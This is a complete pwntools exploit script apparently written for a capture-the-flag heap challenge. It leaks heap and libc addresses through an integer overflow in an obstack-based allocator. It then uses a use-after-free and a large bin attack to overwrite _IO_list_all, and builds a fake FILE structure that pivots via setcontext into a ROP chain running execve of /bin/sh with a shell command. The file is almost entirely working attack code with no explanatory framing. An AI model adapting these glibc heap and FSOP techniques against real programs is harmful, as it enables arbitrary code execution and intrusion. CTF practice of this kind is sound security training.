#!/usr/bin/env python3
from pwn import *
import sys
import re

context.binary = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = 'info'

# --- PoW Configuration ---
POW_RE = re.compile(rb"sh -s ([^\s]+)")

HOST, PORT = "ctf.csd.lol", 2024

# --- Constants ---
CHUNK_USER_SIZE = 0xFE0
OFFSET_MAIN_ARENA = 0x1D3CC0
OFFSET_IO_LIST_ALL = 0x1D4660
OFFSET_WFILE_JUMPS = 0x1D00A0
MXCSR_VAL = 0x1F80

# --- Helper Functions ---

def solve_pow(r):
    log.info("Solving Proof of Work...")
    banner = r.recvuntil(b"solution: ")
    m = POW_RE.search(banner)
    if not m:
        raise ValueError(f"PoW token not found in: {banner!r}")
    token = m.group(1).decode()
    try:
        solution = subprocess.check_output(["./redpwnpow", token]).strip()
        r.sendline(solution)
    except FileNotFoundError:
        log.error("./redpwnpow not found. Please ensure the PoW solver binary is present.")
        sys.exit(1)

def start_process():
    if args.REMOTE:
        r = remote(HOST, PORT)
        solve_pow(r)
        return r
    else:
        return process("./chall")

def consume_prompt(r):
    # Sync output to avoid pointer misalignment
    r.recvuntil(b"0) exit\n> ")

def add_chunk(r, idx, size, content=b""):
    payload = f"1\n{idx}\n{size}\n".encode()
    if size != 0:
        payload += content
    r.send(payload)
    consume_prompt(r)

def delete_chunk(r, idx):
    r.send(f"2\n{idx}\n".encode())
    consume_prompt(r)

def edit_chunk(r, idx, content):
    r.send(f"3\n{idx}\n".encode())
    r.recvuntil(b"data: ")
    r.send(content)
    consume_prompt(r)

def view_chunk(r, idx):
    r.send(f"4\n{idx}\n".encode())
    r.recvuntil(b"data: ")
    # Receive data until the menu appears again
    raw_data = r.recvuntil(b"1) alloc\n", drop=True)
    consume_prompt(r)
    
    if raw_data.endswith(b"\n"):
        return raw_data[:-1]
    return raw_data

def unpack_u64(data):
    return u64(data.ljust(8, b"\x00"))

def get_chunk_metadata(r, idx_pivot, idx_overflow, idx_target):
    """
    Leak chunk->limit pointer by using integer overflow to rewind obstack cursor.
    """
    delete_chunk(r, idx_pivot)
    add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z") # Integer overflow (-16)
    add_chunk(r, idx_target, 0, b"")
    
    leak = view_chunk(r, idx_target)
    if leak:
        return unpack_u64(leak)

    # Fallback: Brute force if pointer starts with null byte (puts truncates)
    for pad_len in range(1, 8):
        delete_chunk(r, idx_pivot)
        add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z")
        # Overwrite pad_len bytes at the start of the pointer
        add_chunk(r, idx_target, pad_len, b"A" * pad_len)
        
        leak = view_chunk(r, idx_target)
        # If output is longer than padding -> leaked the rest of the pointer
        if len(leak) > pad_len:
            # Recover pointer (prepend null bytes + leaked tail)
            recovered_ptr = unpack_u64(b"\x00"*pad_len + leak[pad_len:])
            
            # Clean up heap
            delete_chunk(r, idx_pivot)
            add_chunk(r, idx_overflow, 0xFFFF_FFF0, b"Z")
            add_chunk(r, idx_target, pad_len, b"\x00"*pad_len)
            
            return recovered_ptr
            
    log.error("Failed to recover chunk metadata")
    sys.exit(1)

def get_obstack_addrs(r, idx_pivot, idx_overflow, idx_target):
    limit = get_chunk_metadata(r, idx_pivot, idx_overflow, idx_target)
    base = limit - CHUNK_USER_SIZE
    header = base - 0x10
    return base, header, limit

def construct_fsop_payload(libc_obj, header_addr, shell_cmd):
    """
    Manually construct Fake FILE payload to bypass flat() limitations and ensure correct layout.
    """
    # Addresses
    addr_wfile_jumps = libc_obj.address + OFFSET_WFILE_JUMPS
    addr_setcontext = libc_obj.sym['setcontext']
    addr_binsh = next(libc_obj.search(b"/bin/sh\x00"))
    
    # Gadgets
    gadget_pop_rdi = next(libc_obj.search(asm('pop rdi; ret')))
    gadget_pop_rax_rdx_rbx = next(libc_obj.search(asm('pop rax; pop rdx; pop rbx; ret')))
    gadget_syscall = next(libc_obj.search(asm('syscall; ret')))

    # Internal offsets relative to chunk header
    off_wide_data = 0x108
    off_wide_vtable = 0x188
    off_fenv = 0x1A0
    
    addr_wide_data = header_addr + off_wide_data
    addr_wide_vtable = header_addr + off_wide_vtable
    addr_fenv = header_addr + off_fenv

    # ROP / Args locations inside wide_data
    addr_argv = addr_wide_data + 0x38
    addr_argc = addr_wide_data + 0x58
    addr_cmd = addr_wide_data + 0x60

    # Buffer 0x200 bytes
    payload_buf = bytearray(b"\x00" * 0x200)

    def pack_qword(offset, val):
        payload_buf[offset:offset+8] = p64(val)
    def pack_dword(offset, val):
        payload_buf[offset:offset+4] = p32(val)

    # 1. Fake _IO_FILE
    pack_dword(0x00, 0) # _flags
    pack_qword(0x20, 0) # _IO_write_base
    pack_qword(0x28, 1) # _IO_write_ptr > base (triggers overflow)
    pack_qword(0x68, 0) # _chain
    pack_qword(0x70, addr_argv) # RSI for setcontext
    pack_qword(0x88, 0) # RDX for setcontext
    pack_qword(0xA0, addr_wide_data) # RSP for setcontext
    pack_qword(0xA8, gadget_pop_rdi) # RIP for setcontext
    pack_dword(0xC0, 0) # _mode
    pack_qword(0xD8, addr_wfile_jumps) # vtable
    
    # setcontext specific: pointer to fenv
    pack_qword(0xE0, addr_fenv)
    pack_dword(0x1C0, MXCSR_VAL) # mxcsr

    # 2. Fake _IO_wide_data (acts as ROP stack)
    # ROP Chain: execve("/bin/sh", argv, NULL)
    
    # 0x00: pop rdi
    pack_qword(off_wide_data + 0x00, addr_binsh)
    # 0x08: pop rax; pop rdx; pop rbx
    pack_qword(off_wide_data + 0x08, gadget_pop_rax_rdx_rbx)
    # 0x10: RAX = 59 (execve)
    pack_qword(off_wide_data + 0x10, 59)
    # 0x18: RDX = 0
    pack_qword(off_wide_data + 0x18, 0)
    # 0x20: RBX = 0
    pack_qword(off_wide_data + 0x20, 0)
    # 0x28: syscall
    pack_qword(off_wide_data + 0x28, gadget_syscall)
    # 0x30: space
    pack_qword(off_wide_data + 0x30, 0)
    
    # Argv Array construction
    # argv[0] = /bin/sh
    pack_qword((addr_argv - header_addr) + 0x00, addr_binsh)
    # argv[1] = -c
    pack_qword((addr_argv - header_addr) + 0x08, addr_argc)
    # argv[2] = cmd
    pack_qword((addr_argv - header_addr) + 0x10, addr_cmd)
    # argv[3] = NULL
    pack_qword((addr_argv - header_addr) + 0x18, 0)
    
    # Strings
    c_off = addr_argc - header_addr
    payload_buf[c_off : c_off+3] = b"-c\x00"
    
    cmd_off = addr_cmd - header_addr
    payload_buf[cmd_off : cmd_off + len(shell_cmd) + 1] = shell_cmd + b"\x00"

    # Pointer to wide_vtable
    pack_qword(off_wide_data + 0xE0, addr_wide_vtable)

    # 3. Fake Wide VTable
    # offset 0x68: doallocate -> setcontext
    pack_qword(off_wide_vtable + 0x68, addr_setcontext)

    # 4. FEnv data (for setcontext)
    fenv_data = b"\x7f\x03\x00\x00\xff\xff" + b"\x00"*22
    payload_buf[off_fenv : off_fenv + len(fenv_data)] = fenv_data

    return bytes(payload_buf)

def main():
    r = start_process()

    # --- Step 1: Heap Leak ---
    log.info("Step 1: Leaking Heap addresses...")
    add_chunk(r, 1, 0, b"") # Pivot
    
    # Allocate to move cursor back
    add_chunk(r, 9, 0xFFFF_FFF0, b"Z")
    add_chunk(r, 0, 0, b"")
    
    chunk_A_base, chunk_A_hdr, _ = get_obstack_addrs(r, 1, 9, 0)
    pivot_A = chunk_A_base + 0x10
    log.success(f"Chunk A Base: {hex(chunk_A_base)}")

    # --- Step 2: Libc Leak ---
    log.info("Step 2: Leaking Libc from Unsorted Bin...")
    
    # Setup persistent pointer
    delete_chunk(r, 1)
    add_chunk(r, 2, 0x10, b"A"*0x10)
    
    # Shrink A (0xFF0 -> 0xF00) to prevent consolidation
    delete_chunk(r, 1)
    add_chunk(r, 3, 0xFFFF_FFE0, b"Z") # Shift -0x20
    # Overwrite header: Prev_Size=0, Size=0xF01 | PREV_INUSE
    add_chunk(r, 4, 0x10, p64(0) + p64(0xF01))
    
    # Realign
    delete_chunk(r, 1)
    add_chunk(r, 5, 0xEE0, b"FILLER")
    # Fake next chunk
    add_chunk(r, 6, 0x10, p64(0xF00) + p64(0xF1))
    
    # Freeing invalid index triggers obstack_free(NULL) -> Frees A
    delete_chunk(r, 63)
    
    # Read stale pointer in index 0
    raw_leak = view_chunk(r, 0)
    if not raw_leak:
        log.error("Failed to leak unsorted bin fd")
        
    unsorted_bin_fd = unpack_u64(raw_leak)
    libc.address = unsorted_bin_fd - OFFSET_MAIN_ARENA
    log.success(f"Libc Base: {hex(libc.address)}")

    # --- Step 3: Large Bin Attack ---
    log.info("Step 3: Executing Large Bin Attack on _IO_list_all...")
    
    addr_io_list_all = libc.address + OFFSET_IO_LIST_ALL
    
    # Create Chunk B (0x200) to flush A to Large Bin
    add_chunk(r, 10, 0x200, b"Chunk_B")
    
    # Corrupt A's bk_nextsize (UAF)
    # Target: _IO_list_all - 0x20
    edit_chunk(r, 2, p64(chunk_A_hdr) + p64(addr_io_list_all - 0x20))
    
    # Leak B info
    chunk_B_base, chunk_B_hdr, chunk_B_limit = get_obstack_addrs(r, 10, 11, 12)
    chunk_B_pivot = chunk_B_base + 0x10
    log.info(f"Chunk B Base: {hex(chunk_B_base)}")
    
    # Manipulate B to perform attack
    delete_chunk(r, 10)
    add_chunk(r, 17, 0xFFFF_FFF0, b"Z")
    # Clear prev field
    add_chunk(r, 18, 0x10, p64(chunk_B_limit) + p64(0))
    
    # Shrink B: 0xFF0 -> 0xE00
    delete_chunk(r, 10)
    add_chunk(r, 13, 0xFFFF_FFE0, b"Z")
    add_chunk(r, 14, 0x10, p64(0) + p64(0xE01))
    
    delete_chunk(r, 10)
    # Pad to alignment
    pad_size = (chunk_B_hdr + 0xE00 - chunk_B_pivot) & 0xFFFFFFFF
    add_chunk(r, 15, pad_size, b"PADDING")
    add_chunk(r, 16, 0x10, p64(0xE00) + p64(0x1F1))
    
    # Free obstack -> B (0xE00) goes to Unsorted Bin
    delete_chunk(r, 63)
    
    # Allocate Chunk C -> Forces B into Large Bin
    # B (0xE00) < A (0xF00) => Insert at tail => Write to _IO_list_all
    try:
        add_chunk(r, 30, 0x200, b"Trigger")
    except EOFError:
        pass # Might crash or close, but we continue to overwrite
        
    # --- Step 4: FSOP Payload ---
    log.info("Step 4: Overwriting _IO_list_all target with Fake FILE...")
    
    # We need C's anchor to calculate overwrite length
    chunk_C_base, _, _ = get_obstack_addrs(r, 30, 31, 32)
    chunk_C_pivot = chunk_C_base + 0x10
    
    cmd = b"cat flag* /flag 2>/dev/null"
    payload = construct_fsop_payload(libc, chunk_B_hdr, cmd)
    
    delete_chunk(r, 30)
    # Shift cursor from C to B_Header
    shift_len = (chunk_B_hdr - chunk_C_pivot) & 0xFFFFFFFF
    add_chunk(r, 40, shift_len, b"SHIFT")
    
    # Write Payload
    add_chunk(r, 41, len(payload), payload)
    
    # Trigger exit
    r.sendline(b"0")
    
    # Output flag
    print(r.recvall(timeout=3).decode(errors="ignore"))

if __name__ == "__main__":
    main()